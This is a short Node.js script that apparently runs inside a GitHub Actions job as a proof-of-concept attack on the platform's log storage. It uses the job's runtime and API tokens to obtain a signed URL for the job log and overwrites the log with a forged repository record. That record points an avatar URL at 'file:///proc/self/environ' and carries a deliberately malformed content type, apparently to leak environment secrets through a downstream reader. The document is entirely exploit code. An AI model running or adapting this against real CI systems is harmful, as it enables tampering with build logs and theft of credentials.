import https from 'node:https';
const runtimeToken=process.env.ACTIONS_RUNTIME_TOKEN, apiToken=process.env.GITHUB_TOKEN, resultsBase=process.env.ACTIONS_RESULTS_URL, repositoryName=process.env.GITHUB_REPOSITORY, runId=process.env.GITHUB_RUN_ID;
function request(url, options={}, body){return new Promise((resolve,reject)=>{const req=https.request(url,options,res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,body:Buffer.concat(c)}));});req.on('error',reject);req.setTimeout(20000,()=>req.destroy(new Error('timeout')));if(body!==undefined)req.write(body);req.end();});}
async function postReceiver(method,doc){const b=Buffer.from(JSON.stringify(doc));return request(new URL(`/twirp/results.services.receiver.Receiver/${method}`,resultsBase),{method:'POST',headers:{authorization:`Bearer ${runtimeToken}`,accept:'application/json','content-type':'application/json','content-length':String(b.length)}},b);}
async function gh(path){return request(`https://api.github.com/repos/${repositoryName}${path}`,{headers:{accept:'application/vnd.github.v3+json',authorization:`Bearer ${apiToken}`,'user-agent':'job-block-carrier'}});}
const claims=JSON.parse(Buffer.from(runtimeToken.split('.')[1],'base64url'));const scope=claims.scp.split(' ').find(x=>x.startsWith('Actions.Results:'));if(!scope)throw new Error('no scope');const [,runBackend,jobBackend]=scope.split(':');
let jobId;for(let i=0;i<60&&!jobId;i++){const r=await gh(`/actions/runs/${runId}/jobs?filter=all`);if(r.status===200){const js=JSON.parse(r.body);jobId=js.jobs?.find(j=>j.name===process.env.GITHUB_JOB)?.id??js.jobs?.[0]?.id;}if(!jobId)await new Promise(r=>setTimeout(r,250));}
if(!jobId)throw new Error('no job');
const signed=await postReceiver('GetJobLogsSignedBlobURL',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend});
if(signed.status!==200)throw new Error(`signed ${signed.status}: ${signed.body}`);
const url=JSON.parse(signed.body).logs_url;if(!url)throw new Error('no url');
const repository=`${repositoryName}/actions/jobs/${jobId}/logs`;
const payload=Buffer.from(JSON.stringify({full_name:repository,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'Repo Cassette block carrier',stargazers_count:0}));
const odd='application/json\x85';
const version=new URL(url).searchParams.get('sv')||'2025-11-05';
const put=await request(url,{method:'PUT',headers:{'x-ms-version':version,'x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':odd,'content-type':'application/octet-stream','content-length':String(payload.length)}},payload);
if(put.status!==201)throw new Error(`put ${put.status}: ${put.body.toString().slice(0,300)}`);
const meta=await postReceiver('CreateJobLogsMetadata',{workflow_run_backend_id:runBackend,workflow_job_run_backend_id:jobBackend,uploaded_at:new Date().toISOString(),line_count:1});
console.log('BLOCK_CARRIER',JSON.stringify({repository,jobId,bytes:payload.length,put:put.status,meta:meta.status,metaBody:meta.body.toString().slice(0,100),signedRsct:new URL(url).searchParams.get('rsct')}));
